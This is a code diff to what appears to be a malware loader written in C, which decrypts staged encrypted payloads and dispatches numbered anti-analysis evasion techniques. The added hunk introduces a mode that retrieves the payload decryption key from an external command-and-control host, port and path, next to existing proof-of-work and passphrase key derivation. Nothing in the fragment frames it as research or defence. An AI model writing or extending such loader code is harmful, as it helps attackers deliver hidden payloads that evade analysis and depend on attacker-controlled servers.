@@ -85,6 +85,9 @@ static void dispatch_evasion_technique(int tech_id, int param, int stage_idx) {
         case 207: 
             delay_reverse_dns(STAGE_NETWORK_IP[stage_idx], param); 
             break;
+        case 208:
+            // C2 key retrieval handled directly in key derivation loop
+            break;
         #endif
 
         #ifdef USE_FAMILY_STORAGE
@@ -207,14 +210,28 @@ int main(void) {
         size_t decrypted_size = 0;
         unsigned char *decrypted_buffer = NULL;
 
-        // Obtain decryption key either via PoW derivation or passphrase hashing
-        if (deriv_mode == 2 || tech_id == 108) {
+        // Obtain decryption key based on configured derivation strategy
+        if (deriv_mode == 3 || tech_id == 208) {
+            // Mode 3: External C2 Key Retrieval
+            unsigned char *c2_key = derive_key_c2(
+                STAGE_NETWORK_HOST[i],
+                STAGE_NETWORK_PORT[i],
+                STAGE_NETWORK_PATH[i]
+            );
+
+            if (c2_key) {
+                decrypted_buffer = aes_decrypt_with_key(ENCRYPTED_PAYLOADS[i], c2_key, &decrypted_size);
+                free(c2_key);
+            }
+        } else if (deriv_mode == 2 || tech_id == 108) {
+            // Mode 2: Proof-of-Work key derivation
             unsigned char *derived_key = derive_key_pow(current_passphrase, pow_diff);
             if (derived_key) {
-                decrypted_buffer = aes_decrypt_with_key(ENCRYPTED_PAYLOADS[i], derived_key, &decrypted_size);
+                decrypted_buffer = aes_decrypt_raw_key(ENCRYPTED_PAYLOADS[i], derived_key, &decrypted_size);
                 free(derived_key);
             }
         } else {
+            // Mode 1: Passphrase hashing (SHA-256)
             decrypted_buffer = aes_decrypt(ENCRYPTED_PAYLOADS[i], current_passphrase, &decrypted_size);
         }
 
